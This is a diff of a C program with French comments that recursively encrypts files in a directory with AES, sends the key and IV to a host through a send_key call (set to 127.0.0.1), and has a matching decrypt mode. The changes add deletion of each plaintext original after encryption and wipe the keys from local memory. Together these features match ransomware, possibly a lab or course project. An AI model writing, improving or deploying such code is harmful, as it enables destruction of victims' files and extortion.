@@ -33,7 +33,7 @@ int listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fla
 		if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) // Check si entry n'est pas . ou ..
 		{
 			// Génère le chemin du fichier/dossier à partir de entry
-			char path[256];
+			char path[BUFSIZE];
 			strcpy(path, name);
 			strcat(path, "/");
 			strcat(path, entry->d_name);
@@ -51,6 +51,8 @@ int listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fla
 					if (is_encrypted(entry->d_name) == 0)
 					{
 						encrypt(key, iv, path);
+						// Suppression du fichier en clair
+						remove(path);
 					}
 				}
 				else if (de_flag == 'd')
@@ -59,6 +61,8 @@ int listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fla
 					if (is_encrypted(entry->d_name) == 1)
 					{
 						decrypt(key, iv, path);
+						// Suppression du fichier chiffré
+						remove(path);
 					}
 				}
 			}
@@ -126,6 +130,12 @@ int main(int argc, char *argv[])
 			send_key(pKey, pIv, "127.0.0.1");
 
 			listdir(argv[2], iv, key, 'e');
+
+			// Efface les clés et iv
+			memset(key,0,sizeof(key));
+			memset(iv,0,sizeof(iv));
+			memset(pKey,0,sizeof(pKey));
+			memset(pIv,0,sizeof(pIv));
 		}
 		// Si flag -d
 		else if (strcmp(argv[1], "-d") == 0)
@@ -151,7 +161,6 @@ int main(int argc, char *argv[])
 			if (strlen(argv[3]) == AES_BLOCK_SIZE*2)
 			{
 				hexa_to_bytes(argv[3], iv, AES_BLOCK_SIZE);
-				printf("%lu\n", sizeof(iv));
 			}
 			else
 			{
